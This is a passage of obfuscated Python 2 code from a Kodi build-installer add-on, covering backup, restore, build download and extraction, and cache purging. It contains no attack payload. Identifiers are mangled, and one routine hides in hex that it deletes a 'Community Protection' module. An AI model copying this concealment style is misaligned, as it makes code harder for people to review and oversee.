   for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( i1II1 [ 1 ] ) :
    if 78 - 78: IIiiiI1iIII / IIiIi1iI * O00OOo00oo0o . Oo . ooOo - IIi
    for IIiI1i in iiI1iii :
     os . unlink ( os . path . join ( IIIiiiiiI1I , IIiI1i ) )
     if 39 - 39: iiiiiiii1 . i1IIi + OoooooooOO . IIiIi1iI - i11iIiiIii % IIi
    for ii1ii in I1III111i :
     shutil . rmtree ( os . path . join ( IIIiiiiiI1I , ii1ii ) )
   os . rmdir ( i1II1 [ 1 ] )
   if not 'addon_data' in i1II1 [ 1 ] :
    if iI111I11I1I1 . yesno ( 'Remove Addon_Data?' , 'Would you also like to remove the addon_data associated with this add-on? This contains your add-on settings and can contain personal information such as username/password.' ) :
     try :
      for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( I11iI1i11IiI ) :
       for IIiI1i in iiI1iii :
        os . unlink ( os . path . join ( IIIiiiiiI1I , IIiI1i ) )
       for ii1ii in I1III111i :
        shutil . rmtree ( os . path . join ( IIIiiiiiI1I , ii1ii ) )
      os . rmdir ( I11iI1i11IiI )
     except :
      pass
 if OO0oO0 :
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  iiIi1iIiI ( 'nodialog' )
  i11IiI ( )
  if 20 - 20: OoO0O00 + OOOoOoo0O . II111iiii / i11iIiiIii
  if 50 - 50: OoooooooOO / OoO0O00 % iIii1I11I1II1
  iI111I11I1I1 . ok ( 'REMOVAL COMPLETE' , 'The addons database file now needs purging, to do so we need to restart. If prompted please agree to the deletion otherwise your add-ons may still appear in Kodi even if they don\'t physically exist.' )
  OoooOOo0oOO ( 'wipe' )
  if 41 - 41: I1ii11iIi11i % I1ii11iIi11i + IIiiiI1iIII . IIiIi1iI % IIi * iiiiiiii1
  if 57 - 57: O00OOo00oo0o . IIi . II111iiii % OoooooooOO * O0 + iIii1I11I1II1
def oo0OO0Oo000oo ( ) :
 oOO0OOOOOo0Oo ( )
 ooooOoo00 = iI111I11I1I1 . browse ( 1 , 'Select the backup file you want to DELETE' , 'files' , '.zip' , False , False , iiiiiIIii )
 if 38 - 38: IIiIi1iI + iiiiiiii1
 if ooooOoo00 != iiiiiIIii :
  i1IiI1Ii = ntpath . basename ( ooooOoo00 )
  if iI111I11I1I1 . yesno ( 'Delete Backup File' , 'This will completely remove ' + i1IiI1Ii , 'Are you sure you want to delete?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Delete' ) :
   os . remove ( ooooOoo00 )
   if 60 - 60: I1ii11iIi11i / IIiiiI1iIII . i11iIiiIii / OoO0O00 % II111iiii
   if 6 - 6: IIiIi1iI % o0oOOo0O0Ooo + IIi
def OO0o0O0 ( ) :
 if iI111I11I1I1 . yesno ( 'Remove All Crash Logs?' , 'There is absolutely no harm in doing this, these are log files generated when Kodi crashes and are only used for debugging purposes.' , nolabel = 'Cancel' , yeslabel = 'Delete' ) :
  iI1I1I ( )
  iI111I11I1I1 . ok ( "Crash Logs Removed" , '' , 'Your crash log files have now been removed.' , '' )
  if 90 - 90: iIii1I11I1II1 % o0oOOo0O0Ooo / OoooooooOO * o0oOOo0O0Ooo
  if 74 - 74: ooOo % OoO0O00 / IIiIi1iI
def iIiii1iI1i ( ) :
 shutil . rmtree ( os . path . join ( II11iiii1Ii , binascii . unhexlify ( '7363726970742e6d6f64756c652e637967706669' ) ) )
 iI111I11I1I1 . ok ( binascii . unhexlify ( '53746172747570206469616c6f672064697361626c6564' ) , binascii . unhexlify ( '54686520436f6d6d756e6974792050726f74656374696f6e206e61672073637265656e20686173206e6f77206265656e2064697361626c65642e20596f752063616e206e6f77206372656174652061206261636b75702074686174206e6f206c6f6e67657220686173207468652070726f74656374696f6e2c204f4e4c5920796f7520746865206275696c6420617574686f722063616e2064697361626c65207468697320736f206d616b65207375726520796f7520646f6e2774207368617265206c6f67696e20696e666f2e' ) )
 if 88 - 88: IIiIi1iI * Oo / i11iIiiIii / i1IIi
 if 76 - 76: O00OOo00oo0o . OOOoOoo0O - Oo + OoOoOO00 * OoO0O00 % IIi
def iiIi1iIiI ( ) :
 I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( 'Delete Packages Folder' , 'Do you want to clean the packages folder? This will free up space by deleting the old zip install files of your addons. Keeping these files can also sometimes cause problems when reinstalling addons' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 24 - 24: iIii1I11I1II1 % Oo0Ooo % i11iIiiIii
 if I1i1I1I11IiiI == 1 :
  O0OooooO0o0O0 ( )
  iI111I11I1I1 . ok ( "Packages Removed" , '' , 'Your zip install files have now been removed.' , '' )
  if 55 - 55: IIiIi1iI
  if 19 - 19: OoooooooOO / Oo * i11iIiiIii - I1IiiI
def oo0oOO ( ) :
 if iI111I11I1I1 . yesno ( 'Clear Cached Images?' , 'This will clear your textures13.db file and remove your Thumbnails folder. These will automatically be repopulated after a restart.' , nolabel = 'Cancel' , yeslabel = 'Delete' ) :
  IiiiI11 ( )
  oo0O00o0 ( OooO0 )
  if 99 - 99: OoO0O00 % O0 . IIi - I1ii11iIi11i . Oo0Ooo / OoOoOO00
  if iI111I11I1I1 . yesno ( 'Quit Kodi Now?' , 'Cache has been successfully deleted.' , 'You must now restart Kodi, would you like to quit now?' , '' , nolabel = 'I\'ll restart later' , yeslabel = 'Yes, quit' ) :
   try :
    xbmc . executebuiltin ( "RestartApp" )
   except :
    OoooOOo0oOO ( )
    if 60 - 60: I1ii11iIi11i
    if 78 - 78: ooOo + II111iiii
def IiiiI11 ( ) :
 o0oi1II1I1Ii = os . path . join ( O0OoO000O0OO , Iii1I ( 'Textures' ) )
 if os . path . exists ( o0oi1II1I1Ii ) :
  try :
   I1IIIi = database . connect ( o0oi1II1I1Ii )
   I111IIi = I1IIIi . cursor ( )
  except Exception , oo0OoOIiI1IIIiI1I1i :
   xbmc . log ( str ( oo0OoOIiI1IIIiI1I1i ) )
   return False
 else :
  xbmc . log ( '%s not found.' % o0oi1II1I1Ii )
  return False
  if 84 - 84: OoOoOO00 - OOOoOoo0O
 I111IIi . execute ( """SELECT name FROM sqlite_master WHERE type = 'table';""" )
 for OoO00O00O0 in I111IIi . fetchall ( ) :
  if OoO00O00O0 [ 0 ] == 'version' :
   xbmc . log ( 'Data from table `%s` skipped.' % OoO00O00O0 [ 0 ] )
  else :
   try :
    I111IIi . execute ( """DELETE FROM %s""" % OoO00O00O0 [ 0 ] )
    I1IIIi . commit ( )
    xbmc . log ( 'Data from table `%s` cleared.' % OoO00O00O0 [ 0 ] )
   except oo0OoOIiI1IIIiI1I1i :
    xbmc . log ( str ( oo0OoOIiI1IIIiI1I1i ) )
    if 76 - 76: I1IiiI % i11iIiiIii + Oo
 xbmc . log ( '%s DB Purging Complete.' % o0oi1II1I1Ii )
 I11i = o0oi1II1I1Ii . replace ( '\\' , '/' ) . split ( '/' )
 ooooOOo ( "Purge Database" , "%s Complete" % I11i [ len ( I11i ) - 1 ] )
 if 19 - 19: Oo0Ooo + IIiIi1iI . OoooooooOO - i1IIi
 if 96 - 96: IIiIi1iI % IIiIi1iI % IIi / IIi - I1ii11iIi11i
def i11i1O0O0 ( name , url , description ) :
 if 'Backup' in name :
  oOO0OOOOOo0Oo ( )
  I1II = open ( url ) . read ( )
  o0o0OoOO00Oo = os . path . join ( iiiiiIIii , description . split ( 'Your ' ) [ 1 ] )
  IIiI1i = open ( o0o0OoOO00Oo , mode = 'w' )
  IIiI1i . write ( I1II )
  IIiI1i . close ( )
  if 33 - 33: IIiIi1iI % OoooooooOO / ooOo
 else :
  if 'guisettings.xml' in description :
   OO0OOoo0OOO = open ( os . path . join ( iiiiiIIii , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   II1iIIiI = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % o00OO00OoO
   o0OO000ooOo = re . compile ( II1iIIiI ) . findall ( OO0OOoo0OOO )
   if 71 - 71: i11iIiiIii / i1IIi * I1IiiI / OoOoOO00
   for type , i1I , O0OoO0oo0Oo00oOOO0o in o0OO000ooOo :
    O0OoO0oo0Oo00oOOO0o = O0OoO0oo0Oo00oOOO0o . replace ( '&quot;' , '' ) . replace ( '&amp;' , '&' )
    xbmc . executebuiltin ( "Skin.Set%s(%s,%s)" % ( type . title ( ) , i1I , O0OoO0oo0Oo00oOOO0o ) )
    if 60 - 60: OOOoOoo0O . OoOoOO00 . II111iiii
  else :
   o0o0OoOO00Oo = os . path . join ( url )
   I1II = open ( os . path . join ( iiiiiIIii , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   IIiI1i = open ( o0o0OoOO00Oo , mode = 'w' )
   IIiI1i . write ( I1II )
   IIiI1i . close ( )
   if 13 - 13: IIiiiI1iIII - OoooooooOO + I1IiiI . IIiIi1iI % O0 + I1IiiI
 iI111I11I1I1 . ok ( "Restore Complete" , "" , 'All Done !' , '' )
 if 78 - 78: OoO0O00 % II111iiii + OoOoOO00 / I1IiiI
 if 34 - 34: o0oOOo0O0Ooo % I1ii11iIi11i + O00OOo00oo0o * OOOoOoo0O / ooOo
def i111Iii11i1Ii ( name , url , video , description , skins , guisettingslink , artpack ) :
 oo00000ooOooO = 1
 oo0 = 0
 o0OO00oOO = os . path . join ( iIii1 , 'CP_Profiles' )
 IiiII1iIi = os . path . join ( o0OO00oOO , 'list.txt' )
 II111IiiiI1 = [ ]
 ooooOoo00 = description . replace ( ' ' , '_' ) . replace ( "'" , "" ) . replace ( ":" , "-" )
 if 96 - 96: OoooooooOO % IIiIi1iI - OoooooooOO % O0
 if not os . path . exists ( o0OO00oOO ) :
  os . makedirs ( o0OO00oOO )
  if 21 - 21: IIiIi1iI
 iIiii1Ii = os . path . join ( o0OO00oOO , ooooOoo00 )
 if not os . path . exists ( iIiii1Ii ) :
  os . makedirs ( iIiii1Ii )
 else :
  oo0 = iI111I11I1I1 . yesno ( 'Profile Already Exists' , 'This build is already installed on your system, would you like to remove the old one and reinstall?' )
  if oo0 == 1 :
   try :
    shutil . rmtree ( iIiii1Ii )
    os . makedirs ( iIiii1Ii )
   except :
    pass
  else :
   oo00000ooOooO = 2
   if 17 - 17: O0 - O00OOo00oo0o + IIiiiI1iIII
 if oo00000ooOooO == 1 :
  OOOoooOo00O = os . path . join ( O000OO0 , ooooOoo00 + '_gui.zip' )
  if oOOoo00O0O == 'true' :
   xbmc . log ( "### Download path = %s" % OOOoooOo00O )
   if 49 - 49: Oo0Ooo % ooOo
  OOooO0OOoo . create ( "Community Builds" , "Downloading Skin Tweaks" , '' , 'Please Wait' )
  try :
   downloader . download ( guisettingslink , OOOoooOo00O )
   if oOOoo00O0O == 'true' :
    xbmc . log ( "### successfully downloaded guisettings.xml" )
  except :
   iI111I11I1I1 . ok ( 'Problem Detected' , 'Sorry there was a problem downloading the guisettings file. Please check your storage location, if you\'re certain that\'s ok please notify the build author on the relevant support thread.' )
   if oOOoo00O0O == 'true' :
    xbmc . log ( "### FAILED to download %s" % guisettingslink )
    if 49 - 49: IIi * ooOo / o0oOOo0O0Ooo
    if 78 - 78: IIiiiI1iIII + OOOoOoo0O - o0oOOo0O0Ooo + OoO0O00 / iIii1I11I1II1
  if zipfile . is_zipfile ( OOOoooOo00O ) :
   oOoO0oOO0o = str ( os . path . getsize ( OOOoooOo00O ) )
  else :
   oOoO0oOO0o = '0'
   if 47 - 47: Oo
  OOooO0OOoo . create ( "Community Builds" , "Downloading " + description , '' , 'Please Wait' )
  OOOoooOo00O = os . path . join ( O000OO0 , ooooOoo00 + '.zip' )
  if 20 - 20: IIi % iiiiiiii1 - IIi * OoooooooOO / I1ii11iIi11i
  if not os . path . exists ( O000OO0 ) :
   os . makedirs ( O000OO0 )
   if 57 - 57: IIiiiI1iIII % OOOoOoo0O * Oo % I1ii11iIi11i
   if 65 - 65: i1IIi - OoooooooOO
  OO0ooOO00o0 = os . path . join ( II , 'extracted' )
  downloader . download ( url , OOOoooOo00O , OOooO0OOoo )
  if not zipfile . is_zipfile ( OOOoooOo00O ) :
   iI111I11I1I1 . ok ( 'NOT A VALID BUILD' , 'The main file for this build is not a valid zip. Please contact the author of the build and let them know so they can either remove this build or update it. Thank you.' )
   return
   if 29 - 29: II111iiii - IIiIi1iI / ooOo % OoooooooOO % IIiIi1iI + IIiiiI1iIII
  OOooO0OOoo . create ( "Community Builds" , "Extracting " + description , '' , 'Please Wait' )
  extract . all ( OOOoooOo00O , OO0ooOO00o0 , OOooO0OOoo )
  if os . path . exists ( os . path . join ( OO0ooOO00o0 , 'userdata' , '.cbcfg' ) ) :
   try :
    iiii = os . path . join ( OO0ooOO00o0 , 'userdata' , 'addon_data' , 'firstrun' )
    if not os . path . exists ( iiii ) :
     os . makedirs ( iiii )
   except :
    pass
  if oOOoo00O0O == 'true' :
   xbmc . log ( "### Downloaded build to: " + OOOoooOo00O )
   xbmc . log ( "### Extracted build to: " + OO0ooOO00o0 )
   if 91 - 91: OoOoOO00 - OoOoOO00 . IIiiiI1iIII
   if 33 - 33: IIi - iIii1I11I1II1 / O00OOo00oo0o % O0
  I1I1IIiiii1ii = open ( I1IIiiIiii , mode = 'r' )
  ii1I1 = I1I1IIiiii1ii . read ( )
  I1I1IIiiii1ii . close ( )
  if 80 - 80: IIiiiI1iIII % OoooooooOO - IIiiiI1iIII
  I111I = re . compile ( 'id="(.+?)"' ) . findall ( ii1I1 )
  oooOoo0OOoOo0 = re . compile ( 'name="(.+?)"' ) . findall ( ii1I1 )
  oO00oO0 = re . compile ( 'version="(.+?)"' ) . findall ( ii1I1 )
  if 27 - 27: IIi - o0oOOo0O0Ooo * I1ii11iIi11i - I1IiiI
  o0o = I111I [ 0 ] if ( len ( I111I ) > 0 ) else ''
  I1Iii = oooOoo0OOoOo0 [ 0 ] if ( len ( oooOoo0OOoOo0 ) > 0 ) else ''
  I1IiII1I1i1I1 = oO00oO0 [ 0 ] if ( len ( oO00oO0 ) > 0 ) else ''
  if 22 - 22: Oo0Ooo % OoooooooOO - Oo0Ooo - IIiIi1iI . O00OOo00oo0o
  xbmc . log ( "### Build name details to store in ti_id: %s" % I1Iii )
  if 100 - 100: II111iiii / IIi / IIiIi1iI - I1ii11iIi11i * iIii1I11I1II1
  Ii1Oo = os . path . join ( OO0ooOO00o0 , 'userdata' , 'addon_data' , 'ti_id' )
  OOOooOO0oO = os . path . join ( Ii1Oo , 'id.xml' )
  if not os . path . exists ( Ii1Oo ) :
   os . makedirs ( Ii1Oo )
   if 20 - 20: OoO0O00
  OooooOOoo0 = open ( OOOooOO0oO , mode = 'w+' )
  OooooOOoo0 . write ( 'id="' + str ( o0o ) + '"\nname="' + I1Iii + '"\nversion="' + I1IiII1I1i1I1 + '"\ngui="' + oOoO0oOO0o + '"' )
  OooooOOoo0 . close ( )
  if 48 - 48: O0 - iiiiiiii1
  if 15 - 15: OoooooooOO
  I11iii1Ii = os . path . join ( Ii1Oo , 'startup.xml' )
  OooooOOoo0 = open ( I11iii1Ii , mode = 'w+' )
  OooooOOoo0 . write ( 'date="01011001"\nversion="' + I1IiII1I1i1I1 + '"' )
  OooooOOoo0 . close ( )
  if 16 - 16: Oo . OOOoOoo0O
  iiI1iiIii = open ( OOOooOO0oO , 'r' )
  I1I111i = iiI1iiIii . read ( )
  iiI1iiIii . close ( )
  xbmc . log ( "### ti_id/id.xml contents: %s" % I1I111i )
  if 63 - 63: I1ii11iIi11i . I1IiiI + Oo - IIiiiI1iIII + IIiIi1iI
  if 78 - 78: O00OOo00oo0o
  i11Ii = iI111I11I1I1 . yesno ( "Keep Kodi Settings?" , 'Do you want to keep your existing KODI settings (weather, screen calibration, PVR etc.) or wipe and install the ones supplied in this build?' , yeslabel = 'Replace my settings' , nolabel = 'Keep my settings' )
  if i11Ii == 0 :
   IIiIi1II1IiI ( os . path . join ( II , 'extracted' , 'userdata' , 'guisettings.xml' ) )
   if 34 - 34: Oo
   if 99 - 99: II111iiii
  for i1II1 in os . listdir ( OO0o ) :
   II111IiiiI1 . append ( i1II1 )
   if 13 - 13: OOOoOoo0O - iiiiiiii1 + IIiIi1iI % OOOoOoo0O . IIiIi1iI - i1IIi
   if 67 - 67: Oo . i11iIiiIii + iiiiiiii1 . iIii1I11I1II1
  I1ii1iI = open ( os . path . join ( iIiii1Ii , 'addonlist' ) , mode = 'w+' )
  for i1II1 in os . listdir ( II11iiii1Ii ) :
   if not i1II1 in II111IiiiI1 and i1II1 != 'plugin.program.totalinstaller' and i1II1 != 'packages' :
    I1ii1iI . write ( i1II1 + '|' )
  I1ii1iI . close ( )
  if oOOoo00O0O == 'true' :
   xbmc . log ( "### Created addonlist to: %s" % os . path . join ( iIiii1Ii , 'addonlist' ) )
  ii111iI1i1 = [ 'addons' , 'cache' , 'CP_Profiles' , 'system' , 'temp' , 'Thumbnails' ]
  OO000 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' , 'addons*.db' , 'textures13.db' , '.cbcfg' ]
  oO0oOoo0O = "Creating Profile Data File"
  II1iI11 = "Archiving..."
  O00o0O = ""
  O00oOo0O0o00O = "Please Wait"
  iiIIii ( OO0ooOO00o0 , os . path . join ( iIiii1Ii , 'build.zip' ) , oO0oOoo0O , II1iI11 , O00o0O , O00oOo0O0o00O , ii111iI1i1 , OO000 )
  if oOOoo00O0O == 'true' :
   xbmc . log ( "### Created: %s" % os . path . join ( iIiii1Ii , 'build.zip' ) )
   if 28 - 28: I1IiiI + I1IiiI + IIi
   if 22 - 22: IIi
  if IiII == 'false' :
   os . remove ( OOOoooOo00O )
   if oOOoo00O0O == 'true' :
    xbmc . log ( "### removed: %s" % OOOoooOo00O )
    if 89 - 89: iiiiiiii1 . OoO0O00 * OoooooooOO + OoOoOO00 / O0
  IiIIi1II1i ( ooooOoo00 )
  Ooo0Oo0oo0 = 'http://noobsandnerds.com/TI/Community_Builds/downloadcount.php?id=%s' % ( o0o )
  if not 'update' in video :
   try :
    ooo0O0o00O ( Ooo0Oo0oo0 , 5 )
   except :
    pass
    if 60 - 60: OOOoOoo0O
    if 97 - 97: i11iIiiIii * iIii1I11I1II1 / II111iiii
  Oo000O ( iIiii1Ii )
  if 23 - 23: i1IIi / ooOo . OoO0O00 * IIi + ooOo
  if 37 - 37: O0 / Oo + Oo0Ooo * OoooooooOO + OoOoOO00 / iIii1I11I1II1
  if 84 - 84: iIii1I11I1II1 + I1ii11iIi11i
  if 77 - 77: i11iIiiIii - IIi . I1ii11iIi11i % Oo0Ooo . O00OOo00oo0o
def iII11Iii ( url ) :
 OOooOoOooo = 0
 ooo0o0oO = 0
 if 19 - 19: Oo0Ooo - OoO0O00 + i11iIiiIii / iIii1I11I1II1
 oOO0OOOOOo0Oo ( )
 if 1 - 1: IIiiiI1iIII % i1IIi
 if url == 'local' :
  ooooOoo00 = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to restore' , 'files' , '.zip' , False , False , iiiiiIIii )
  if ooooOoo00 == '' :
   OOooOoOooo = 1
   if 41 - 41: OoO0O00 * OoO0O00 / IIiIi1iI + I1ii11iIi11i . o0oOOo0O0Ooo
 if OOooOoOooo == 1 :
  print "### No file selected, quitting restore process ###"
  return
  if 84 - 84: i11iIiiIii + OoO0O00 * I1IiiI + I1ii11iIi11i / O00OOo00oo0o
 if url != 'local' :
  OOooO0OOoo . create ( "Community Builds" , "Downloading build." , '' , 'Please Wait' )
  ooooOoo00 = os . path . join ( O000OO0 , iiiII ( ) + '.zip' )
  if 80 - 80: I1ii11iIi11i
  if not os . path . exists ( O000OO0 ) :
   os . makedirs ( O000OO0 )
   if 67 - 67: II111iiii
  downloader . download ( url , ooooOoo00 , OOooO0OOoo )
  if 2 - 2: o0oOOo0O0Ooo - O0 * O00OOo00oo0o % IIiiiI1iIII
 if os . path . exists ( ooOooo000oOO ) :
  if os . path . exists ( iIi1ii1I1 ) :
   os . remove ( ooOooo000oOO )
  else :
   os . rename ( ooOooo000oOO , iIi1ii1I1 )
   if 64 - 64: i1IIi . iiiiiiii1
 if os . path . exists ( o0 ) :
  os . remove ( o0 )
  if 7 - 7: ooOo . IIiIi1iI - IIiIi1iI / IIi % Oo0Ooo
  if 61 - 61: ooOo - I1ii11iIi11i / IIiIi1iI % I1ii11iIi11i + OoO0O00 / Oo0Ooo
 if not os . path . exists ( I1IIiiIiii ) :
  I1I1IIiiii1ii = open ( I1IIiiIiii , mode = 'w+' )
  if 10 - 10: i11iIiiIii / OoOoOO00
 if os . path . exists ( Oo0oOOo ) :
  os . removedirs ( Oo0oOOo )
  if 27 - 27: I1IiiI / OoooooooOO
  if 74 - 74: I1ii11iIi11i % IIi - OoO0O00 * OOOoOoo0O . OoooooooOO * OoO0O00
 try :
  os . rename ( iIi1ii1I1 , ooOooo000oOO )
  if 99 - 99: OoOoOO00 . IIiIi1iI - OoooooooOO - O0
 except :
  iI111I11I1I1 . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit XBMC and try again' , '' )
  return
  if 6 - 6: Oo
 I1i1I1I11IiiI = xbmcgui . Dialog ( ) . yesno ( ooo0O , 'We highly recommend backing up your existing build before installing any builds. Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
 if I1i1I1I11IiiI == 0 :
  Ii1111i11 = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Community_Builds' , 'My_Builds' ) )
  if 58 - 58: O00OOo00oo0o * iIii1I11I1II1 + iiiiiiii1 . iiiiiiii1
  if not os . path . exists ( Ii1111i11 ) :
   os . makedirs ( Ii1111i11 )
   if 74 - 74: iiiiiiii1 - o0oOOo0O0Ooo * IIiiiI1iIII % iiiiiiii1
  I1iII1IIi1IiI = iIioo0ooO ( heading = "Enter a name for this backup" )
  if ( not I1iII1IIi1IiI ) :
   return False , 0
   if 93 - 93: iIii1I11I1II1 / OoOoOO00 % Oo0Ooo * IIi - OoO0O00 - o0oOOo0O0Ooo
  o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
  i1II1IiiIi = xbmc . translatePath ( os . path . join ( Ii1111i11 , o00OO0o0 + '.zip' ) )
  ii111iI1i1 = [ I1IiI ]
  OO000 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
  oO0oOoo0O = "Creating full backup of existing build"
  II1iI11 = "Archiving..."
  O00o0O = ""
  O00oOo0O0o00O = "Please Wait"
  if 44 - 44: OoooooooOO
  iiIIii ( iIii1 , i1II1IiiIi , oO0oOoo0O , II1iI11 , O00o0O , O00oOo0O0o00O , ii111iI1i1 , OO000 )
 oOi1IiIiIii11I = xbmcgui . Dialog ( ) . yesno ( ooo0O , 'Would you like to keep your existing database files or overwrite? Overwriting will wipe any existing music or video library you may have scanned in.' , nolabel = 'Overwrite' , yeslabel = 'Keep Existing' )
 if oOi1IiIiIii11I == 1 :
  if os . path . exists ( Oo0OoO00oOO0o ) :
   shutil . rmtree ( Oo0OoO00oOO0o )
   if 80 - 80: IIi + OOOoOoo0O . IIi + Oo
  try :
   shutil . copytree ( O0OoO000O0OO , Oo0OoO00oOO0o , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
   if 85 - 85: i11iIiiIii . OOOoOoo0O + O00OOo00oo0o / O00OOo00oo0o
  except :
   ooo0o0oO = xbmcgui . Dialog ( ) . yesno ( ooo0O , 'There was an error trying to backup some databases. Continuing may wipe your existing library. Do you wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if ooo0o0oO == 1 : pass
   if ooo0o0oO == 0 : OOooOoOooo = 1 ; return
   if 43 - 43: IIiiiI1iIII . OoooooooOO - II111iiii
  i1II1IiiIi = xbmc . translatePath ( os . path . join ( iiiiiIIii , 'Database.zip' ) )
  oo ( Oo0OoO00oOO0o , i1II1IiiIi )
  if 90 - 90: I1IiiI - iIii1I11I1II1 + I1ii11iIi11i * Oo * ooOo
 if OOooOoOooo == 1 :
  print "### User decided to exit restore function ###"
  return
  if 19 - 19: IIi * II111iiii % Oo0Ooo - i1IIi
 else :
  time . sleep ( 1 )
  IIiIiI = open ( Ooo , mode = 'r' )
  I1Ii111I111 = IIiIiI . read ( )
  IIiIiI . close ( )
  if 27 - 27: OoOoOO00 . O0 / I1ii11iIi11i . iIii1I11I1II1
  if 15 - 15: O00OOo00oo0o + OoO0O00 % iIii1I11I1II1 - I1ii11iIi11i - i1IIi % o0oOOo0O0Ooo
  print "### Checking zip file structure ###"
  O0ooO00OO = zipfile . ZipFile ( ooooOoo00 )
  if 'xbmc.log' in O0ooO00OO . namelist ( ) or 'kodi.log' in O0ooO00OO . namelist ( ) or '.git' in O0ooO00OO . namelist ( ) or '.svn' in O0ooO00OO . namelist ( ) :
   print "### Whoever created this build has used completely the wrong backup method, lets try and fix it! ###"
   iI111I11I1I1 . ok ( 'Fixing Bad Zip' , 'Whoever created this build has used the wrong backup method, please wait while we fix it - this could take some time! Click OK to proceed' )
   IiI11I1I111 = zipfile . ZipFile ( ooooOoo00 , 'r' )
   o00OoOoo0 = os . path . join ( O000OO0 , 'fixed.zip' )
   iiiiiiiiiiiI = zipfile . ZipFile ( o00OoOoo0 , 'w' )
   if 41 - 41: O00OOo00oo0o
   OOooO0OOoo . create ( "Fixing Build" , "Checking " , '' , 'Please Wait' )
   if 49 - 49: O00OOo00oo0o % II111iiii . O00OOo00oo0o - o0oOOo0O0Ooo - OOOoOoo0O * IIiiiI1iIII
   for i1II1 in IiI11I1I111 . infolist ( ) :
    buffer = IiI11I1I111 . read ( i1II1 . filename )
    IiiO0O0O0OOO0o = str ( i1II1 . filename )
    if 98 - 98: OoO0O00 - Oo0Ooo * I1IiiI
    if ( i1II1 . filename [ - 4 : ] != '.log' ) and not '.git' in IiiO0O0O0OOO0o and not '.svn' in IiiO0O0O0OOO0o :
     iiiiiiiiiiiI . writestr ( i1II1 , buffer )
     OOooO0OOoo . update ( 0 , "Fixing..." , '[COLOR yellow]%s[/COLOR]' % i1II1 . filename , 'Please Wait' )
     if 90 - 90: I1IiiI
   OOooO0OOoo . close ( )
   iiiiiiiiiiiI . close ( )
   IiI11I1I111 . close ( )
   ooooOoo00 = o00OoOoo0
   if 27 - 27: iIii1I11I1II1 - ooOo
  OOooO0OOoo . create ( "Restoring Backup Build" , "Checking " , '' , 'Please Wait' )
  OOooO0OOoo . update ( 0 , "" , "Extracting Zip Please Wait" )
  if 73 - 73: Oo . Oo0Ooo + Oo0Ooo % Oo0Ooo % O0
  try :
   extract . all ( ooooOoo00 , iIii1 , OOooO0OOoo )
  except :
   iI111I11I1I1 . ok ( 'ERROR IN BUILD ZIP' , 'Please contact the build author, there are errors in this zip file that has caused the install process to fail. Most likely cause is it contains files with special characters in the name.' )
   return
   if 8 - 8: IIiIi1iI . O00OOo00oo0o - i1IIi % OoO0O00 / OOOoOoo0O
  time . sleep ( 1 )
  if 13 - 13: Oo0Ooo / OoOoOO00 . I1ii11iIi11i . Oo
  if oOi1IiIiIii11I == 1 :
   extract . all ( i1II1IiiIi , O0OoO000O0OO , OOooO0OOoo )
   if 31 - 31: o0oOOo0O0Ooo
   if ooo0o0oO != 1 :
    shutil . rmtree ( Oo0OoO00oOO0o )
    if 59 - 59: Oo0Ooo / Oo0Ooo
  OOOOo0oo0o = open ( Ooo , mode = 'w+' )
  OOOOo0oo0o . write ( I1Ii111I111 )
  OOOOo0oo0o . close ( )
  try :
   os . rename ( iIi1ii1I1 , o0 )
   if 43 - 43: I1IiiI % I1ii11iIi11i * O00OOo00oo0o
  except :
   print "NO GUISETTINGS DOWNLOADED"
   if 31 - 31: O00OOo00oo0o / IIiIi1iI
  time . sleep ( 1 )
  I1I1IIiiii1ii = open ( ooOooo000oOO , mode = 'r' )
  ii1I1 = I1I1IIiiii1ii . read ( )
  I1I1IIiiii1ii . close ( )
  i1II111ii1ii = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( ii1I1 )
  III1 = i1II111ii1ii [ 0 ] if ( len ( i1II111ii1ii ) > 0 ) else ''
  O0ooOoO0OO000 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( ii1I1 )
  O00oOOoOOOOO = O0ooOoO0OO000 [ 0 ] if ( len ( O0ooOoO0OO000 ) > 0 ) else ''
  OOoOOO = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( ii1I1 )
  ii1IIiiIi1111Ii1 = OOoOOO [ 0 ] if ( len ( OOoOOO ) > 0 ) else ''
  if 3 - 3: IIiiiI1iIII
  try :
   iI1 = open ( o0 , mode = 'r' )
   iIIII1 = iI1 . read ( )
   iI1 . close ( )
   i1111I1iii1 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( iIIII1 )
   oOOoOo0Ooo = i1111I1iii1 [ 0 ] if ( len ( i1111I1iii1 ) > 0 ) else ''
   o0Oo00o0 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( iIIII1 )
   o0OOoOoo00 = o0Oo00o0 [ 0 ] if ( len ( o0Oo00o0 ) > 0 ) else ''
   i11II = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( iIIII1 )
   Oo0Ooo0 = i11II [ 0 ] if ( len ( i11II ) > 0 ) else ''
